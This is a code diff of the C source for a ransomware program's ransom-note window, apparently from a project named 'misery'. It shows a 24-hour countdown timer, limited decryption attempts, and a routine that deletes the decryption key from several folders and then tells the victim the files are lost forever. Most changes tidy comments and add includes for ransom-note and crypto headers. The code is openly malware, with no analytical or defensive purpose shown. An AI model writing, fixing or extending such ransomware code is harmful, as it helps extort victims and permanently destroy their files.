@@ -9,6 +9,8 @@
 #include <stdio.h>
 #include <process.h>
 #include <shlobj.h>
+#include "ransomnote.h"
+#include "crypto.h"
 #include "fileops.h"
 #include "misery_config.h"
 
@@ -48,7 +50,7 @@ static HBRUSH  g_hbrAccent    = NULL;
 static HBRUSH  g_hbrCodeBg    = NULL;
 static HBRUSH  g_hbrDecryptBg = NULL;
 static HBRUSH  g_hbrTimerBg   = NULL;
-static HBRUSH  g_hbrCloseBtn  = NULL;  /* persistent brush for CLOSE button */
+static HBRUSH  g_hbrCloseBtn  = NULL;
 static HFONT   g_hFontHead    = NULL;
 static HFONT   g_hFontSub     = NULL;
 static HFONT   g_hFontBody    = NULL;
@@ -192,8 +194,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
         /* ── Timer display (right side of banner) ──
          *  FIX: Direct child of hWnd, NOT hBanner.
          *  This ensures GetDlgItem(hWnd, IDC_TIMER) finds it,
-         *  and WM_CTLCOLORSTATIC reaches RansomWndProc.
-         *  Coordinates are still window-relative (banner starts at 0,0). */
+         *  and WM_CTLCOLORSTATIC reaches RansomWndProc. */
         CreateWindowExW(0, L"STATIC", L"24:00:00",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
             640, 95, 180, 60, hWnd, (HMENU)IDC_TIMER, hInst, NULL);
@@ -421,7 +422,6 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             SetTextColor(hdc, CLR_WHITE);
             SetBkColor(hdc, CLR_HEADLINE);
             SelectObject(hdc, g_hFontBody);
-            /* FIX: Use persistent brush instead of create/delete leak */
             return (LRESULT)g_hbrCloseBtn;
         }
         if (wcsstr(btnText, L"DECRYPT")) {
@@ -436,7 +436,6 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
     case WM_COMMAND:
         if (LOWORD(wParam) == IDC_CLOSE) {
             DestroyWindow(hWnd);
-            /* FIX: WM_DESTROY already calls PostQuitMessage — do NOT call it here */
             return 0;
         }
 
@@ -504,7 +503,6 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
                 "Attempts remaining: %d / %d",
                 remaining, MAX_DECRYPT_ATTEMPTS);
 
-            /* FIX: Show remaining attempts in the status bar too */
             SetWindowTextA(hStatus, msgBuf);
 
             if (g_decryptAttempts >= MAX_DECRYPT_ATTEMPTS) {
@@ -589,7 +587,7 @@ static void UpdateAttemptsDisplay(HWND hWnd) {
 static void DestroyKeyAndClose(HWND hWnd) {
     MiseryLog(MISERY_LOG_WARN, "RansomNote: Key destruction triggered!");
 
-    /* Delete misery.key from multiple locations */
+    /* Delete misery.key from all locations */
     DeleteFileA("misery.key");
 
     char desktop[MAX_PATH];
@@ -599,7 +597,6 @@ static void DestroyKeyAndClose(HWND hWnd) {
         DeleteFileA(keyPath);
     }
 
-    /* Also delete from %TEMP% */
     char tempPath[MAX_PATH];
     if (GetTempPathA(MAX_PATH, tempPath)) {
         char keyPath3[MAX_PATH * 2];
@@ -607,7 +604,6 @@ static void DestroyKeyAndClose(HWND hWnd) {
         DeleteFileA(keyPath3);
     }
 
-    /* Also delete from current directory */
     char curDir[MAX_PATH];
     GetCurrentDirectoryA(MAX_PATH, curDir);
     if (_stricmp(curDir, desktop) != 0 && _stricmp(curDir, tempPath) != 0) {
@@ -621,13 +617,13 @@ static void DestroyKeyAndClose(HWND hWnd) {
 
     /* Show final message */
     MessageBoxA(hWnd,
-        "TIME EXPIRED — The decryption key has been destroyed.\n"
+        "TIME EXPIRED \u2014 The decryption key has been destroyed.\n"
         "YOUR FILES ARE PERMANENTLY UNRECOVERABLE.",
         "FILES LOST FOREVER", MB_OK | MB_ICONERROR);
 
     KillTimer(hWnd, 1);
     DestroyWindow(hWnd);
-    /* FIX: WM_DESTROY will post the quit message — don't duplicate it */
+    /* WM_DESTROY will post the quit message */
 }
 
 /* ═══════════════════════════════════════════════════════════════
@@ -641,7 +637,7 @@ static void CreateResources(void) {
     g_hbrCodeBg    = CreateSolidBrush(CLR_CODE_BG);
     g_hbrDecryptBg = CreateSolidBrush(CLR_DECRYPT_BG);
     g_hbrTimerBg   = CreateSolidBrush(CLR_TIMER_BG);
-    g_hbrCloseBtn  = CreateSolidBrush(CLR_HEADLINE); /* FIX: persistent brush */
+    g_hbrCloseBtn  = CreateSolidBrush(CLR_HEADLINE);
 
     LOGFONTW lf;
     ZeroMemory(&lf, sizeof(lf));
